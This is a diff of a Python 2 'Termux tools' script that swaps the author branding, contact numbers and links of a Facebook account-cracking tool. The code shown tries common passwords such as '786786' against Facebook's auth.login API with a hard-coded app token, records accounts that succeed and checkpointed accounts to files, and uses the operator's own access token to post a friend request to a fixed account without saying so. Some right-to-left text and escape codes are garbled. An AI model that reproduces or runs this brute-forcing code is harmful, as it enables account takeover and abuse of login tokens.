@@ -49,15 +49,15 @@ def jalan(z):
 #### LOGO ####
 logo = """
 \033[0;39m  ¤*¨¨*¤.¸¸.¤*¨¨*¤.¸¸.¤*¨¨\
-\033[0;39m  \ RAWAND   دنەوەڕ　        \
+\033[0;39m  \RAWAND   دنەوەڕ     　   \
 \033[0;39m  .\¤*¨¨*¤.¸¸.¤*¨¨*¤.¸¸.¤*¨¨
 \033[0;39m  튠/
 \033[0;39m  /▌
 \033[0;39m  / \
 \033[0;39m╔▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╗
-\033[0;39m║\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mHACKR•|USAMA.TRICKER\033[0;31m║
-\033[0;39m║\033[1;33m* \033[1;33mGitHub  \033[1;33m : \033[1;33m\033[4mhttps://Github.com/USAMATRICKER\033[0m \033[0;31m║
-\033[0;39m║\033[0;36m* \033[0;32mWhatsApp \033[1;32m: \033[1;32m+1 (302) 306-1248\033[0;31m║
+\033[0;39m║\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mHACKR•|MR RAWAND\033[0;31m║
+\033[0;39m║\033[1;33m* \033[1;33ساپس  \033[1;33m : \033[1;33m\033[4یاویهەب دووس \033[0m \033[0;31m║
+\033[0;39m║\033[0;36m* \033[0;32mنەیالەل \033[1;32m: \033[1;32m+1 (دنەوەڕ[0;31m║
 \033[0;34m╚▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╝"""
 
 def tik():
@@ -77,9 +77,9 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print "\x1b[0;31m⚔═══════════════════════════☠═══════════════════════════⚔"
-print  """\x1b[0;31m [¤] \x1b[0;31mASSALAM O ALAIKUM\x1b[0;31m  \033[1;96m   [¤] \x1b[0;31mWHATSAPP : +1 (302) 306-1248\x1b[1;96m  
+print  """\x1b[0;31m [¤] \x1b[0;31mASSALAM O ALAIKUM\x1b[0;31m  \033[1;96m   [¤] \x1b[0;31mMR : RAWAND\x1b[1;96m  
 \033[1;93m [¤] \x1b[0;31mSTAY HOME\x1b[1;96m      [¤] \x1b[0;31mFACEBOOK : TERMUX TOOLS\x1b[1;96m  
-\033[1;93m [¤] \x1b[0;31mTOOLS BY USAMA TRICKER\x1b[1;96m  [¤] \x1b[0;31mYOUTUBE  : USAMA TRICKER\x1b[0;31m"""
+\033[1;93m [¤] \x1b[0;31mTOOLS BY RAWAND TRICKER\x1b[1;96m  [¤] \x1b[0;31mYOUTUBE  : USAMA TRICKER\x1b[0;31m"""
 print " \x1b[1;93m⚔══════════════════════════☠═══════════════════════════⚔"
 
 CorrectUsername = "MR"
@@ -95,16 +95,16 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "yang bener dong"
-            os.system('xdg-open https://www.youtube.com/channel/UCwq6RUSe8gO4fUlXxX1HUQA')
+            os.system('xdg-open https://wa.me/6285691015635')
     else:
         print "salah sayang!"
-        os.system('xdg-open https://www.youtube.com/channel/UCwq6RUSe8gO4fUlXxX1HUQA')
+        os.system('xdg-open https://wa.me/6285691015635')
 
 def login():
 	os.system('clear')
 	try:
 		toket = open('login.txt','r')
-		menu() 
+		menu()
 	except (KeyError,IOError):
 		os.system('clear')
 		print logo
@@ -139,7 +139,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://www.youtube.com/channel/UCwq6RUSe8gO4fUlXxX1HUQA')
+				os.system('xdg-open https://www.youtube.com/channel/UCyo6dFjHh_I1ftQ-a0Is2Aw')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -192,7 +192,7 @@ def menu():
 	print "   \033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
 	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
 	print "\033[1;32;40m[1] \033[1;33;40m══Start Hack3ing"	
-	print "\033[1;32;40m[2] \033[1;33;40m══Update RAWAND"																														
+	print "\033[1;32;40m[2] \033[1;33;40m══Update Usama"																														
 	print "\033[1;32;40m[0] \033[1;33;40m══Log out"
 	pilih()
 
@@ -368,7 +368,7 @@ def pilih_super():
 											cek.close()
 											cekpoint.append(user+pass4)
 										else:
-											pass5 = '1'
+											pass5 = '786786'
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
@@ -409,7 +409,6 @@ def pilih_super():
 																	cek.write(user+"|"+pass7+"\n")
 																	cek.close()
 																	cekpoint.append(user+pass7)
-‌                                                                                                                                                  
 		except:																		
 			pass
 		
